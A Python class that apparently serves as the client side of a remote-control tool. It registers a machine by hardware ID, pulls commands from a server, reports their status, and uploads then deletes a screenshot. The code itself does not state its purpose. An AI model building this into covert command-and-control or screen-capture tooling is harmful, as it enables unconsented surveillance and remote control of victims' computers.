'''Class api_requests'''
import os
import requests

class Requests:
    '''Class used to do all request to API'''

    url = None
    setup_data = None
    header = {
        "Content-type": "application/x-www-form-urlencoded",
        "Accept": "text/plain"
    }

    def __init__(self, hwid, host_data):
        self.url = host_data['DOMAIN'] + ":" + host_data['PORT'] + "/api"
        response = requests.get(self.url + "/get-setup/" + str(hwid))  # pylint: disable=W3101
        return self.return_response(response, False)

    def get_command(self, cmd_id):
        '''Method used to do get command as json format'''
        response = requests.get(self.url + "/get-commands/" + str(cmd_id))  # pylint: disable=W3101
        return self.return_response(response, True)

    def post_new_setup(self, payload):
        '''Method used to do create new setups'''
        path = str(self.url) + "/post-setup"
        response = requests.post(path, data=payload, headers=self.header)  # pylint: disable=W3101
        self.setup_data = self.return_response(response, True)

    def update_cmd_status(self, cmd_id):
        '''Method used to update status on specific command used'''
        path = str(self.url) + "/update-cmd-status/" + str(cmd_id)
        response = requests.get(path)  # pylint: disable=W3101
        return self.return_response(response, False)
            
    def upload_file(self):
        '''Method used to upload screenshots'''
        dir = os.listdir("tmp")
        if len(dir) > 0:
            data = open('tmp/ss.jpg', 'rb')
            path = str(self.url) + "/upload-ss"
            response = requests.post(path,files={"img": data})
            data.close()
            os.remove("tmp/ss.jpg")
            return self.return_response(response, False)

    def return_response(self, req_response, json):
        if req_response.status_code == 200:
            print("A successful request has been made.")
        else:
            print(req_response.json())
        if json == True:
            return req_response.json()